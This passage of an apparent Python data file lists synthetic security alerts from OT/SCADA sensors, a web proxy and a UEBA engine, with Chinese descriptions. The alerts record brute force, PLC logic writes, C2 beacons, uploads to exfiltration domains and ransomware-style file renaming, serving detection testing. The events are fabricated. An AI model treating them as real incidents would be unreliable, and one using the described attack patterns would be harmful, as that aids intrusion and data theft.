        "rule_id": "OT-Rule-06-Controller-Password-Reset-Attempt",
        "rule_name": "控制器密码重置尝试",
        "alert_date": "2025-09-18T17:35:50Z",
        "tags": ["authentication", "password-reset", "brute-force"],
        "severity": "High",
        "reference": "控制器PLC-PROD-02上发生多次密码重置失败",
        "description": "检测到对 PLC-PROD-02 控制器进行多次失败的密码重置尝试。这表明可能存在暴力破解或未经授权的访问尝试。",
        "artifacts": [
            {"type": "device_id", "value": "PLC-PROD-02"},
            {"type": "ip", "value": "10.1.1.11"},
            {"type": "attempt_count", "value": 5}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:35:49.111Z",
            "event_type": "AuthenticationFailure",
            "device_details": {"device_id": "PLC-PROD-02", "ip_address": "10.1.1.11"},
            "auth_details": {"attempt_count": 5, "protocol": "Modbus", "source_ip": "10.1.1.99"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-07-Unauthorized-Access-to-Engineering-Workstation",
        "rule_name": "工程工作站未经授权访问",
        "alert_date": "2025-09-18T17:40:25Z",
        "tags": ["access-control", "workstation", "lateral-movement"],
        "severity": "High",
        "reference": "WKS-ENG-12上发生未授权访问",
        "description": "检测到工程工作站 WKS-ENG-12 上发生未经授权的登录尝试。此工作站包含敏感的工程项目文件，是攻击者的主要目标。",
        "artifacts": [
            {"type": "device_id", "value": "WKS-ENG-12"},
            {"type": "ip", "value": "10.1.2.55"},
            {"type": "source_ip", "value": "10.1.1.10"},
            {"type": "username", "value": "guest"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-engineering",
            "timestamp": "2025-09-18T17:40:24.789Z",
            "event_type": "LoginAttempt",
            "device_details": {"device_id": "WKS-ENG-12", "ip_address": "10.1.2.55"},
            "auth_details": {"username": "guest", "status": "failed", "source_ip": "10.1.1.10"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-08-New-Device-on-SCADA-Network",
        "rule_name": "SCADA网络中新增设备",
        "alert_date": "2025-09-18T17:45:10Z",
        "tags": ["inventory", "network-scan", "new-device"],
        "severity": "Medium",
        "reference": "SCADA网络中出现未知的PLC",
        "description": "检测到 SCADA 网络中出现一个未在资产清单中注册的新 PLC。这可能是未经授权的连接或侦察行为。",
        "artifacts": [
            {"type": "device_type", "value": "PLC"},
            {"type": "ip", "value": "10.1.1.15"},
            {"type": "mac", "value": "00:1A:2B:3C:4D:5E"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:45:09.600Z",
            "event_type": "NewDeviceDiscovery",
            "device_details": {"ip_address": "10.1.1.15", "mac_address": "00:1A:2B:3C:4D:5E", "device_type": "PLC"},
            "security_context": {"reason": "Device not in asset inventory"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-09-Process-Parameter-Out-of-Range",
        "rule_name": "生产过程参数超出安全范围",
        "alert_date": "2025-09-18T17:50:40Z",
        "tags": ["process-anomaly", "physical-impact", "safety"],
        "severity": "High",
        "reference": "CHEM-PUMP-04的压力超出正常范围",
        "description": "化学泵 CHEM-PUMP-04 的压力读数异常升高，已超出预设的安全操作范围。这可能由恶意命令或设备故障引起。",
        "artifacts": [
            {"type": "device_id", "value": "CHEM-PUMP-04"},
            {"type": "ip", "value": "10.2.1.22"},
            {"type": "parameter", "value": "Pressure"},
            {"type": "value", "value": "150 PSI"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line04",
            "timestamp": "2025-09-18T17:50:39.123Z",
            "event_type": "ProcessValueAnomaly",
            "device_details": {"device_id": "CHEM-PUMP-04", "ip_address": "10.2.1.22"},
            "value_details": {"parameter": "Pressure", "value": 150, "unit": "PSI", "normal_range": "20-80"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-10-Lateral-Movement-Attempt-Protocol-Hop",
        "rule_name": "协议跳跃式横向移动尝试",
        "alert_date": "2025-09-18T17:55:05Z",
        "tags": ["lateral-movement", "protocol-hop"],
        "severity": "High",
        "reference": "IT网络主机通过SCADA网络访问PLC",
        "description": "IT 网络中的一台工作站（10.100.1.5）尝试通过 SCADA 网关（10.1.1.1）直接访问 PLC 设备。此行为违反了分段原则。",
        "artifacts": [
            {"type": "source_ip", "value": "10.100.1.5"},
            {"type": "destination_ip", "value": "10.1.1.10"},
            {"type": "protocol", "value": "Modbus/TCP"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-gateway-01",
            "timestamp": "2025-09-18T17:55:04.990Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.100.1.5",
                "destination_ip": "10.1.1.10",
                "destination_port": 502,
                "protocol": "TCP"
            },
            "network_context": {"reason": "IT-to-OT unauthorized protocol flow"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-11-Network-Scan-Activity",
        "rule_name": "生产网络扫描活动",
        "alert_date": "2025-09-18T18:00:15Z",
        "tags": ["reconnaissance", "network-scan"],
        "severity": "High",
        "reference": "主机10.1.2.80扫描生产网络",
        "description": "检测到来自主机 10.1.2.80 的大规模端口扫描活动，目标是生产网络中的多个 OT 设备。这通常是攻击者在进行侦察。",
        "artifacts": [
            {"type": "source_ip", "value": "10.1.2.80"},
            {"type": "scan_target_count", "value": 50},
            {"type": "ports_scanned", "value": ["502", "102", "44818"]}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-18T18:00:14.543Z",
            "event_type": "NetworkScanDetection",
            "scan_details": {
                "source_ip": "10.1.2.80",
                "target_ips": ["10.1.1.10", "10.1.1.11", "..."],
                "scanned_ports": [502, 102, 44818]
            },
            "security_context": {"reason": "Systematic port scanning of OT devices"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-12-Failed-Logic-Transfer-Attempt",
        "rule_name": "PLC逻辑传输失败尝试",
        "alert_date": "2025-09-18T18:05:30Z",
        "tags": ["plc", "logic-change", "failure"],
        "severity": "Medium",
        "reference": "PLC-PROD-03的逻辑程序上传失败",
        "description": "检测到向 PLC-PROD-03 上传新逻辑程序的失败尝试。这可能表明存在未经授权的固件修改或恶意的逻辑注入。",
        "artifacts": [
            {"type": "device_id", "value": "PLC-PROD-03"},
            {"type": "ip", "value": "10.1.1.12"},
            {"type": "action", "value": "PLC-Logic-Write"},
            {"type": "status", "value": "Failed"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T18:05:29.987Z",
            "event_type": "DeviceControlActivity",
            "device_details": {"device_id": "PLC-PROD-03", "ip_address": "10.1.1.12", "vendor": "Rockwell"},
            "activity_details": {"action": "logic-write", "status": "failed", "source_ip": "10.1.2.55", "reason": "Checksum mismatch"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-13-Suspicious-File-Transfer-SCADA",
        "rule_name": "SCADA服务器可疑文件传输",
        "alert_date": "2025-09-18T18:10:45Z",
        "tags": ["file-transfer", "data-exfiltration", "scada"],
        "severity": "High",
        "reference": "SCADA-Server-01向外部传输文件",
        "description": "SCADA 服务器 SCADA-Server-01 向生产网络外部的服务器（10.1.50.200）发起了一个大文件的传输。这可能与数据外泄有关。",
        "artifacts": [
            {"type": "source_device", "value": "SCADA-Server-01"},
            {"type": "source_ip", "value": "10.1.2.10"},
            {"type": "destination_ip", "value": "10.1.50.200"},
            {"type": "protocol", "value": "FTP"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-scada",
            "timestamp": "2025-09-18T18:10:44.666Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.2.10",
                "destination_ip": "10.1.50.200",
                "destination_port": 21,
                "protocol": "TCP",
                "bytes_out": 250000000
            },
            "network_context": {"reason": "Large outbound file transfer from SCADA server"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-14-Firmware-Tampering-Attempt",
        "rule_name": "固件篡改尝试",
        "alert_date": "2025-09-18T18:15:20Z",
        "tags": ["firmware", "tampering", "integrity"],
        "severity": "Critical",
        "reference": "传感器SENSOR-TEMP-07固件哈希值异常",
        "description": "温度传感器 SENSOR-TEMP-07 的固件哈希值与已知良好哈希值不匹配。这表明其固件可能已被篡改。",
        "artifacts": [
            {"type": "device_id", "value": "SENSOR-TEMP-07"},
            {"type": "ip", "value": "10.2.2.35"},
            {"type": "file_hash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line04",
            "timestamp": "2025-09-18T18:15:19.444Z",
            "event_type": "FirmwareIntegrityCheck",
            "device_details": {"device_id": "SENSOR-TEMP-07", "ip_address": "10.2.2.35"},
            "integrity_details": {"firmware_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                                  "known_good_hash": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3", "reason": "Hash mismatch"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-15-Unauthorized-Serial-Communication",
        "rule_name": "未经授权的串行通信",
        "alert_date": "2025-09-18T18:20:00Z",
        "tags": ["serial-communication", "legacy-protocol", "physical-access"],
        "severity": "High",
        "reference": "HMI-CTRL-01与PLC-PROD-01的串行通信异常",
        "description": "人机界面 HMI-CTRL-01 与 PLC-PROD-01 之间建立了未经授权的串行通信。此通信绕过了网络安全控制，可能被用于发送恶意命令。",
        "artifacts": [
            {"type": "source_device", "value": "HMI-CTRL-01"},
            {"type": "destination_device", "value": "PLC-PROD-01"},
            {"type": "protocol", "value": "Modbus-RTU"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T18:19:59.876Z",
            "event_type": "SerialCommunication",
            "communication_details": {
                "source_device": "HMI-CTRL-01",
                "destination_device": "PLC-PROD-01",
                "port": "COM1",
                "protocol": "Modbus-RTU"
            },
            "security_context": {"reason": "Unauthorized physical or serial communication link"}
        }
    }
]

proxy_alert = [
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-01-Malware-Download-Blocked",
        "rule_name": "阻止恶意软件下载",
        "alert_date": "2025-09-18T19:00:15Z",
        "tags": ["malware", "download", "blocked"],
        "severity": "Critical",
        "reference": "用户a.smith尝试从恶意站点下载可执行文件",
        "description": "代理服务器阻止了用户 a.smith 从已知恶意域名下载一个可执行文件。该文件被安全引擎标记为恶意软件。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "destination_url", "value": "http://malware-distro.com/update.exe"},
            {"type": "threat_name", "value": "Trojan.Agent"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:00:14.998Z",
            "event_type": "WebAccess",
            "user_details": {"username": "a.smith", "ip_address": "192.168.2.54"},
            "access_details": {
                "url": "http://malware-distro.com/update.exe",
                "method": "GET",
                "status": "403 Forbidden",
                "policy": "Blocklist-ThreatIntel"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "engine": "Antivirus Scan"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-02-C2-Communication-Blocked",
        "rule_name": "阻止C2通信",
        "alert_date": "2025-09-18T19:05:30Z",
        "tags": ["c2", "cobaltstrike", "blocked"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05尝试连接C2服务器",
        "description": "代理服务器检测并阻止了来自主机 FIN-WKS-JDOE-05 对已知命令与控制 (C2) 服务器的连接请求。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "threat_type", "value": "C2 Traffic"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:05:29.876Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "https://known-bad.c2.server/api/v1/data",
                "method": "POST",
                "status": "403 Forbidden",
                "policy": "ThreatIntel-C2"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "Known C2 domain/IP"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-03-Phishing-URL-Detected",
        "rule_name": "访问钓鱼网站被阻止",
        "alert_date": "2025-09-18T19:10:45Z",
        "tags": ["phishing", "url-threat", "blocked"],
        "severity": "High",
        "reference": "用户c.jones尝试访问钓鱼网站",
        "description": "代理服务器阻止了用户 c.jones 访问一个伪装成公司登录门户的钓鱼网站。",
        "artifacts": [
            {"type": "username", "value": "c.jones"},
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "destination_url", "value": "http://mycorp-ssologin.net/portal"},
            {"type": "threat_type", "value": "Phishing"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:10:44.666Z",
            "event_type": "WebAccess",
            "user_details": {"username": "c.jones", "ip_address": "192.168.3.88"},
            "access_details": {
                "url": "http://mycorp-ssologin.net/portal",
                "status": "403 Forbidden",
                "policy": "Phishing-Blocklist"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "URL impersonation pattern"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-04-Unauthorized-Cloud-Storage",
        "rule_name": "未经授权的云存储访问",
        "alert_date": "2025-09-18T19:15:20Z",
        "tags": ["data-exfiltration", "cloud-storage"],
        "severity": "Medium",
        "reference": "用户d.chen访问个人Dropbox账户",
        "description": "用户 d.chen 访问了未经公司授权的个人云存储服务（Dropbox）。这可能用于数据外泄。",
        "artifacts": [
            {"type": "username", "value": "d.chen"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_domain", "value": "dropbox.com"},
            {"type": "threat_type", "value": "Policy Violation"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-03",
            "timestamp": "2025-09-18T19:15:19.444Z",
            "event_type": "WebAccess",
            "user_details": {"username": "d.chen", "ip_address": "192.168.4.12"},
            "access_details": {
                "url": "https://www.dropbox.com/home",
                "status": "200 OK",
                "policy": "Block-Unauthorized-Cloud-Storage"
            },
            "security_context": {
                "action": "Alert Only",
                "reason": "Policy violation: Access to unauthorized cloud storage"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-05-High-Risk-Category-Access",
        "rule_name": "访问高风险内容类别",
        "alert_date": "2025-09-18T19:20:05Z",
        "tags": ["policy-violation", "high-risk"],
        "severity": "Low",
        "reference": "用户m.li访问赌博网站",
        "description": "用户 m.li 访问了被归类为“赌博”的高风险网站。该行为违反了公司的网络使用策略。",
        "artifacts": [
            {"type": "username", "value": "m.li"},
            {"type": "source_ip", "value": "192.168.5.31"},
            {"type": "destination_domain", "value": "online-casino.com"},
            {"type": "category", "value": "Gambling"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:20:04.555Z",
            "event_type": "WebAccess",
            "user_details": {"username": "m.li", "ip_address": "192.168.5.31"},
            "access_details": {
                "url": "http://www.online-casino.com/play",
                "status": "200 OK",
                "policy": "Permit-Alert"
            },
            "security_context": {
                "category": "Gambling",
                "action": "Alert Only"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-06-Suspicious-User-Agent",
        "rule_name": "可疑用户代理访问",
        "alert_date": "2025-09-18T19:25:50Z",
        "tags": ["anomaly", "botnet", "reconnaissance"],
        "severity": "Medium",
        "reference": "FIN-WKS-JDOE-05使用异常用户代理访问网络",
        "description": "主机 FIN-WKS-JDOE-05 发起的网络请求使用了异常的用户代理（User-Agent），这可能与僵尸网络或自动化脚本活动有关。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "user_agent", "value": "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/56.0"},
            {"type": "threat_type", "value": "Botnet/C2"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:25:49.111Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "http://api.external-service.org/check",
                "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/56.0",
                "status": "200 OK"
            },
            "security_context": {
                "reason": "User-Agent mismatch with known browser patterns"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-07-SSL-Inspection-Bypass",
        "rule_name": "SSL检查规避尝试",
        "alert_date": "2025-09-18T19:30:25Z",
        "tags": ["evasion", "ssl-tls", "policy-violation"],
        "severity": "High",
        "reference": "用户j.doe尝试绕过SSL检查",
        "description": "用户 j.doe 尝试访问一个通过无效证书来规避 SSL 检查的网站。该行为可能用于隐藏恶意流量或访问不当内容。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "bad-cert-site.com"},
            {"type": "threat_type", "value": "Evasion"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:30:24.789Z",
            "event_type": "SSLConnection",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "ssl_details": {
                "url": "https://bad-cert-site.com",
                "verdict": "Blocked",
                "reason": "Invalid or untrusted SSL certificate"
            },
            "security_context": {
                "action": "Blocked",
                "reason": "SSL inspection bypass attempt"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-08-File-Upload-to-Suspicious-Domain",
        "rule_name": "文件上传到可疑域名",
        "alert_date": "2025-09-18T19:35:10Z",
        "tags": ["data-exfiltration", "file-upload"],
        "severity": "Medium",
        "reference": "用户a.smith向可疑域名上传文件",
        "description": "用户 a.smith 上传了一个文件到已知信誉低下的域名。这可能表明数据外泄正在进行。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "destination_domain", "value": "data-receiver.ru"},
            {"type": "action", "value": "file-upload"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-03",
            "timestamp": "2025-09-18T19:35:09.600Z",
            "event_type": "WebAccess",
            "user_details": {"username": "a.smith", "ip_address": "192.168.2.54"},
            "access_details": {
                "url": "http://data-receiver.ru/upload.php",
                "method": "POST",
                "file_size_bytes": 1200000,
                "status": "200 OK"
            },
            "security_context": {
                "reason": "File upload to a low-reputation domain"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-09-High-Volume-DNS-Queries",
        "rule_name": "高频DNS查询",
        "alert_date": "2025-09-18T19:40:40Z",
        "tags": ["dns", "reconnaissance", "data-tunneling"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05发起大量异常DNS查询",
        "description": "主机 FIN-WKS-JDOE-05 在短时间内发起大量异常 DNS 查询。该行为可能与 DNS 隧道通信或侦察活动有关。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "query_count", "value": 500}
        ],
        "raw_log": {
            "proxy_server": "proxy-dns-gw-01",
            "timestamp": "2025-09-18T19:40:39.123Z",
            "event_type": "DNSQuery",
            "user_details": {"ip_address": "192.168.1.101"},
            "query_details": {
                "domain_list": ["a.exfil.dns.com", "b.exfil.dns.com", "..."],
                "query_rate": "100 queries/sec"
            },
            "security_context": {
                "reason": "High-volume, rapid-fire DNS queries"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-10-Policy-Violation-Circumvention",
        "rule_name": "试图规避策略",
        "alert_date": "2025-09-18T19:45:25Z",
        "tags": ["evasion", "circumvention", "vpn"],
        "severity": "High",
        "reference": "用户j.doe尝试访问VPN服务",
        "description": "用户 j.doe 试图访问并连接到 VPN 服务，以规避公司的网络代理和内容过滤策略。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "nordvpn.com"},
            {"type": "threat_type", "value": "Circumvention"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:45:24.777Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "https://nordvpn.com/login",
                "status": "403 Forbidden",
                "policy": "Block-VPN-Anonymizers"
            },
            "security_context": {
                "action": "Blocked",
                "reason": "Attempt to access a VPN service to bypass security controls"
            }
        }
    }
]
ueba_alert = [
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-01-Lateral-Movement-Spike",
        "rule_name": "夜间异常横向移动",
        "alert_date": "2025-09-23T22:35:00Z",
        "tags": ["lateral-movement", "anomaly", "after-hours", "compromised-account"],
        "severity": "High",
        "reference": "用户j.doe账户在非工作时间异常登录多台服务器",
        "description": "用户 j.doe 的账户在夜间（非其通常工作时间）异常登录了多台不属于其日常工作范围的服务器。这与该账户的历史行为基线存在显著偏差，可能表明账户已被盗用。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "time_of_day", "value": "After-hours"},
            {"type": "login_count", "value": 7},
            {"type": "login_targets", "value": ["SRV-FINANCE-02", "SRV-HR-05", "DB-PROD-01"]}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T22:34:59.789Z",
            "event_type": "LoginAnomaly",
            "user_details": {"username": "j.doe", "department": "Finance"},
            "behavioral_details": {
                "login_time": "22:30-22:35",
                "normal_login_time": "09:00-18:00",
                "login_target_change_score": 9.5,
                "login_rate_score": 8.8
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-02-Unusual-Data-Volume-Download",
        "rule_name": "非正常数据外发量",
        "alert_date": "2025-09-23T11:15:20Z",
        "tags": ["data-exfiltration", "anomaly", "insider-threat"],
        "severity": "High",
        "reference": "用户h.lin下载大量文件到个人云存储",
        "description": "用户 h.lin 在短时间内从公司的 SharePoint 下载了异常大批量的文件，并将其同步到个人 Google Drive。这与该用户的历史数据传输习惯严重不符。",
        "artifacts": [
            {"type": "username", "value": "h.lin"},
            {"type": "data_source", "value": "SharePoint"},
            {"type": "data_destination", "value": "Google Drive"},
            {"type": "data_volume_gb", "value": 2.5},
            {"type": "file_count", "value": 150}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T11:15:19.444Z",
            "event_type": "DataTransferAnomaly",
            "user_details": {"username": "h.lin", "department": "HR"},
            "behavioral_details": {
                "normal_data_volume_gb_24h": 0.05,
                "current_data_volume_gb_24h": 2.5,
                "volume_deviation_score": 9.8,
                "destination_deviation_score": 9.0
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-03-Account-Brute-Force-Multiple-Sources",
        "rule_name": "多源账户暴力破解",
        "alert_date": "2025-09-23T05:40:55Z",
        "tags": ["authentication", "brute-force", "distributed-attack"],
        "severity": "High",
        "reference": "来自多个IP地址对单个账户的暴力破解",
        "description": "检测到针对账户 s.brown 的大量失败登录尝试，这些尝试来自多个不同的外部 IP 地址。这表明可能存在分布式暴力破解攻击。",
        "artifacts": [
            {"type": "target_username", "value": "s.brown"},
            {"type": "failed_logins", "value": 58},
            {"type": "source_ip_count", "value": 12},
            {"type": "time_window_minutes", "value": 10}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T05:40:54.666Z",
            "event_type": "AuthenticationAnomaly",
            "user_details": {"username": "s.brown", "department": "Sales"},
            "behavioral_details": {
                "failed_login_rate": 5.8,
                "failed_login_rate_score": 9.2,
                "ip_source_entropy": 7.1
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-04-Service-Account-Unusual-Access",
        "rule_name": "服务账户异常访问",
        "alert_date": "2025-09-23T14:50:30Z",
        "tags": ["service-account", "anomaly", "privilege-escalation"],
        "severity": "High",
        "reference": "服务账户SVC-APP-01访问敏感数据库",
        "description": "服务账户 SVC-APP-01 通常仅用于应用程序通信，但现在却尝试访问一个包含客户 PII 的数据库，这与该账户的正常行为模式严重不符。",
        "artifacts": [
            {"type": "account_name", "value": "SVC-APP-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "action", "value": "Database Query"},
            {"type": "target_resource", "value": "DB-CUSTOMER-PII"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T14:50:29.999Z",
            "event_type": "ServiceAccountAnomaly",
            "entity_details": {"entity_name": "SVC-APP-01", "entity_type": "Service Account"},
            "behavioral_details": {
                "normal_access_patterns": ["App-DB-01", "App-API-Gateway"],
                "current_access_target_deviation": 9.9
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-05-Insider-Trading-Recon",
        "rule_name": "可疑的内部侦察活动",
        "alert_date": "2025-09-23T10:25:40Z",
        "tags": ["insider-threat", "reconnaissance", "data-exfiltration"],
        "severity": "Medium",
        "reference": "用户l.wang搜索机密项目文件",
        "description": "用户 l.wang（非相关部门）在文件服务器上多次搜索并访问与“Project Chimera”相关的机密文件。该项目与该用户的日常职责无关。",
        "artifacts": [
            {"type": "username", "value": "l.wang"},
            {"type": "source_ip", "value": "192.168.1.55"},
            {"type": "search_keywords", "value": ["Project Chimera", "acquisition", "financial model"]},
            {"type": "file_access_count", "value": 20}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T10:25:39.111Z",
            "event_type": "FileAccessAnomaly",
            "user_details": {"username": "l.wang", "department": "Marketing"},
            "behavioral_details": {
                "normal_file_access_path": ["/marketing/", "/campaigns/"],
                "abnormal_file_access_path": ["/finance/projects/"]
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-06-Geographic-Login-Impossible-Travel",
        "rule_name": "异地登录（不可能行程）",
        "alert_date": "2025-09-23T08:10:15Z",
        "tags": ["impossible-travel", "geolocation", "compromised-account"],
        "severity": "High",
        "reference": "用户m.li在两地同时或短时间登录",
        "description": "用户 m.li 的账户在 10 分钟内分别从中国和美国登录。这在物理上是不可能的，强烈表明账户已被盗用。",
        "artifacts": [
            {"type": "username", "value": "m.li"},
            {"type": "login_1_ip", "value": "203.0.113.1"},
            {"type": "login_1_country", "value": "China"},
            {"type": "login_2_ip", "value": "198.51.100.25"},
            {"type": "login_2_country", "value": "United States"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T08:10:14.543Z",
            "event_type": "ImpossibleTravel",
            "user_details": {"username": "m.li", "department": "R&D"},
            "behavioral_details": {
                "time_between_logins_min": 10,
                "distance_km": 11000,
                "speed_kph": 66000
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-07-Workstation-Communication-Anomaly",
        "rule_name": "工作站异常通信",
        "alert_date": "2025-09-23T13:45:00Z",
        "tags": ["network-anomaly", "workstation", "c2"],
        "severity": "Medium",
        "reference": "WKS-ENG-12与不寻常主机通信",
        "description": "工程工作站 WKS-ENG-12 突然开始与一个不属于公司网络的内部主机进行高频通信，这偏离了其日常通信模式，可能表明感染或侦察行为。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-ENG-12"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "192.168.5.88"},
            {"type": "protocol", "value": "TCP", "port": 4444}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T13:44:59.123Z",
            "event_type": "NetworkFlowAnomaly",
            "entity_details": {"entity_name": "WKS-ENG-12", "entity_type": "Workstation"},
            "behavioral_details": {
                "normal_destination_ips": ["192.168.4.1", "10.10.1.10"],
                "flow_deviation_score": 8.5
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-08-Excessive-Privilege-Use",
        "rule_name": "特权账户异常使用",
        "alert_date": "2025-09-23T16:10:30Z",
        "tags": ["privileged-account", "escalation", "misuse"],
        "severity": "High",
        "reference": "特权账户k.smith异常查询员工工资信息",
        "description": "特权账户 k.smith 异常地访问了包含员工工资数据的敏感数据库。尽管该账户有此权限，但此行为与该用户的日常职责无关。",
        "artifacts": [
            {"type": "username", "value": "k.smith"},
            {"type": "source_ip", "value": "192.168.1.200"},
            {"type": "resource", "value": "HR-Salary-DB"},
            {"type": "action", "value": "read"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T16:10:29.876Z",
            "event_type": "PrivilegedAccessAnomaly",
            "user_details": {"username": "k.smith", "department": "IT Operations"},
            "behavioral_details": {
                "normal_access_targets": ["IT-Asset-DB", "Network-Logs-DB"],
                "deviation_reason": "Access to out-of-scope database"
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-09-Mass-File-Renaming",
        "rule_name": "批量文件重命名/加密",
        "alert_date": "2025-09-23T18:05:55Z",
        "tags": ["ransomware", "data-destruction", "file-anomaly"],
        "severity": "High",
        "reference": "主机WKS-HR-03上发生大规模文件重命名",
        "description": "主机 WKS-HR-03 在短时间内执行了异常大量的批量文件重命名操作，将文件扩展名改为 '.encrypted'。这与勒索软件活动的行为模式高度一致。",
